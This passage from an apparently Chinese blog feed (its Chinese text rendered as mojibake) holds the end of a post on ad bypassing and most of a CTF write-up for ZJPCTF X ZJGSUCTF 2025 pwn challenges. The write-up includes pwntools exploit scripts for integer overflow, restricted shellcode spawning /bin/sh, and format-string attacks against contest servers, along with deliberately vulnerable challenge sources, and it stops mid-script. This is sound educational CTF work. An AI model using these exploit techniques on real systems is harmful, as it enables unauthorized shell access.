title="img"><p>è¿™é‡Œæœ‰ä¸€ä¸ªurlæ¯”è¾ƒå¥‡æ€ªï¼Œå°±æ˜¯acc.qq.comï¼Œå¥½åƒæ¯æ¬¡å¹¿å‘Šéƒ½ä¼šå‡ºç°ï¼Œä½†æ˜¯å…·ä½“ç‚¹è¿›å»åˆä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå…¨æ˜¯è·¯ç”±ï¼Œä½†æ˜¯è¿™ä¸ªæ„Ÿè§‰å°±æ¯”è¾ƒå…³é”®</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211105554-45cbdb9b-f73e-4085-8bdc-4d35dec3abfc.png" class="" title="img"><p>å…ˆå°è¯•è¿œç¨‹æ˜ å°„ä¸€ä¸‹ï¼Œå‘ç°ä¸å½±å“æ­£å¸¸åŠŸèƒ½ï¼Œä¸”å¹¿å‘Šä¹Ÿèƒ½æœ‰æ•ˆå»é™¤ï¼ŒæŒ‰ä¸Šè¿°æ€è·¯æ¥åšï¼Œå‘ç°å†ç‚¹å‡»è§†é¢‘å°±ä¼šç›´æ¥æ˜¾ç¤ºç½‘é€Ÿ</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211122615-0d68b664-92ad-4f0b-8c7c-20c63ec8bc9a.png" class="" title="img"><p>ç„¶åä¸‹é¢ä¹Ÿèƒ½æ˜¾ç¤ºè·³è¿‡ç‰‡å¤´</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211140169-53273d3f-62d7-4c82-81ec-1f1b915c7609.png" class="" title="img"><p>åé¢å»æœäº†ä¸€ä¸‹acc.qq.comå‘ç°å’Œ*è®¯åŠ¨æ¼«ç›¸å…³</p>]]></content>
    
    
    <categories>
      
      <category>ä½œä¸šä¸é¡¹ç›®æ€»ç»“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ZJPCTF X ZJGSUCTF 2025 Reverse&amp;Pwn wp</title>
    <link href="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/"/>
    <url>/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="math-game"><a href="#math-game" class="headerlink" title="math_game"></a>math_game</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š10+</p><p>å®é™…è§£å‡ºäººæ•°ï¼š20</p><p>welcomeå‡½æ•°æ˜¯è¾“å‡ºä¸€å †å­—ç¬¦ä¸²ï¼ŒæŒ‰å›è½¦è¿›å…¥math1</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746587052292-0fb66682-8f81-4700-b873-3323ff920aee.png" class="" title="img"><p>ä¼ªéšæœºæ•°ç”Ÿæˆä¸¤ä¸ªæ•°ï¼Œè¦æ±‚è¾“å…¥ä¸¤ä¸ªæ•°ä¹˜ç§¯</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746587093436-769725a0-aa3f-4c4f-aec1-1db5173ca27a.png" class="" title="img"><p>æœ‰5ç§’çš„æ—¶é—´ï¼Œè¶…æ—¶åˆ™æ— æ•ˆ</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746587163509-558b53ea-86e9-4ca6-877f-e13a009fabda.png" class="" title="img"><p>æ­¤é¢˜è€ƒæŸ¥çš„æ˜¯å¸¸è§„çš„pwntoolså‡½æ•°ä½¿ç”¨ï¼Œè¿™é‡Œç”¨evalå¿«é€Ÿè®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./math&#x27;</span><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>ru(<span class="hljs-string">&quot;challenge.&quot;</span>)<br>s(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>s=io.recvuntil(<span class="hljs-string">&quot; = &quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#print(s)</span><br>s1=<span class="hljs-built_in">eval</span>(s)<br><span class="hljs-comment">#print(s1)</span><br>sl(<span class="hljs-built_in">str</span>(s1).encode())<br>inter()<br></code></pre></td></tr></table></figure><h2 id="not-checkin"><a href="#not-checkin" class="headerlink" title="not_checkin"></a>not_checkin</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š6</p><p>å®é™…è§£å‡ºäººæ•°ï¼š15</p><p>æ ¹æ®é¢˜ç›®æè¿°å’Œä¸‹é¢çš„mainï¼Œå¾ˆæ˜æ˜¾éœ€è¦æ•´æ•°æº¢å‡ºç»•è¿‡è´Ÿå·</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746411913102-440fef18-4d77-423a-801a-168fa08f5c56.png" class="" title="img"><p>æ ¹æ®32ä½æœ‰ç¬¦å·æ•´æ•°èŒƒå›´ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°éœ€è¦è¾“å…¥2147483651</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./not_checkin&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;124.221.156.93&#x27;</span>,<span class="hljs-number">32818</span>)<br><br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2147483651</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure><p>é¢˜ç›®æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">60</span>];<br>    <span class="hljs-type">int</span> v5;<br><br>    init(argc, argv, envp);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to 2025 ZJPCTF X ZJGSUCTF, this is a pwn checkin game.&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input a number to getshell: &quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (fgets(s, <span class="hljs-number">50</span>, <span class="hljs-built_in">stdin</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Detected negative sign.&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            v5 = atoi(s);<br>            <span class="hljs-keyword">if</span> (v5 == <span class="hljs-number">-2147483645</span>) &#123;<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are wrong.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="strange-shellcode"><a href="#strange-shellcode" class="headerlink" title="strange_shellcode"></a>strange_shellcode</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š3</p><p>å®é™…è§£å‡ºäººæ•°ï¼š1</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746415699725-a7408e75-6d3a-4d8d-b45a-7ada0bcdc713.png" class="" title="img"><p>strangeçš„ç‚¹åœ¨äºæŠŠrspå’Œrbpç½®é›¶ï¼Œä¹Ÿå°±æ˜¯è¯´ç›´æ¥ç”¨ç³»ç»Ÿç”Ÿæˆçš„shellcodeæ²¡ç”¨</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746415713834-5580f2fa-f5e8-4dc9-bf6c-69f92187b8b4.png" class="" title="img"><p>å› ä¸ºé¢˜ç›®ä¸­å·²ç»æŠŠrcxå’Œrdxç½®é›¶äº†ï¼Œè€ƒè™‘ç›´æ¥ç”¨ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./strange_shellcode&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node.vnteam.cn&#x27;</span>,<span class="hljs-number">45311</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov al,59</span><br><span class="hljs-string">add rdi,8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-comment">#debug()</span><br>s(shellcode)<br>inter()<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥è€ƒè™‘æ¢å¤æ ˆåå†™ä¸€ä¸ªreadçš„shellcodeï¼Œç„¶åå†åˆ©ç”¨ç³»ç»Ÿç”Ÿæˆçš„shellcode</p><p>æŠŠ rsp ç§»åˆ°åé¢å¯è¯»å†™çš„ä½ç½®å½“ stack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsp,rdi</span><br><span class="hljs-string">add rsp,0x50</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,rdi</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">call rsi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>s(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br>shellcode=asm(shellcraft.sh())<br>s(shellcode)<br>inter()<br></code></pre></td></tr></table></figure><p>æºç ä½¿ç”¨å†…è”æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><br>__attribute__((naked)) <span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span> &#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;endbr64;\n&quot;</span><br>        <span class="hljs-string">&quot;push %rbp;\n&quot;</span><br>        <span class="hljs-string">&quot;mov %rsp, %rbp;\n&quot;</span><br>        <span class="hljs-string">&quot;mov %rdi, -0x30(%rbp);\n&quot;</span> <br>        <span class="hljs-string">&quot;mov -0x30(%rbp), %rdi;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rbp, %rbp;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rsp, %rsp;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rsi, %rsi;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rax, %rax;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rcx, %rcx;\n&quot;</span><br>        <span class="hljs-string">&quot;xor %rdx, %rdx;\n&quot;</span><br>        <span class="hljs-string">&quot;jmp *%rdi;\n&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span> &#123;<br>    <span class="hljs-type">void</span> *buf;<br><br>    init();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello ZJPCTF X ZJGSUCTF ctfers!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Legend says there was a bug hidden in a mysterious memory page.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ZJPCTF ctfers tried every trick, but it was the ZJGSUCTF ctfers who whispered:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\&quot;Try jumping to it... literally.\&quot; Can you uncover their secret?&quot;</span>);<br><br>    buf = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x202505000</span>, <span class="hljs-number">0x1000</span>,<br>               PROT_READ | PROT_WRITE | PROT_EXEC,<br>               MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x14</span>);<br><br>    mprotect(buf, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC);<br><br>    exploit(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="format-master"><a href="#format-master" class="headerlink" title="format_master"></a>format_master</h2><p>é¢„è®¡è§£å‡ºäººæ•°ï¼š1</p><p>å®é™…è§£å‡ºäººæ•°ï¼š0</p><p>ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€ï¼ˆå®é™…ä¸Šæ˜¯æ“ä½œå¤±è¯¯ä½†æ˜¯ä¸æƒ³æ”¹äº†ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æœ‰éé¢„æœŸï¼‰</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746773477504-6a746282-b8e0-437a-b4ec-ff3edde1e191.png" class="" title="img"><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746773531165-3e20fc57-1667-446e-aabb-4082940d016b.png" class="" title="img"><p>keyæ˜¯å…¨å±€å˜é‡ï¼Œéœ€è¦ç”¨magicé‡Œé¢çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746605259014-8f8cb1b0-4e14-497d-9d3a-798cdddc7b2a.png" class="" title="img"><p>åç»­æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œåˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œå¯ä»¥è€ƒè™‘ä¿®æ”¹è¿”å›åœ°å€é‡æ–°åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹printfä¸ºsystemï¼Œå†è¯»å…¥ä¸€æ¬¡&#x2F;bin&#x2F;shå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./format_master&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;124.221.156.93&#x27;</span>,<span class="hljs-number">32817</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span 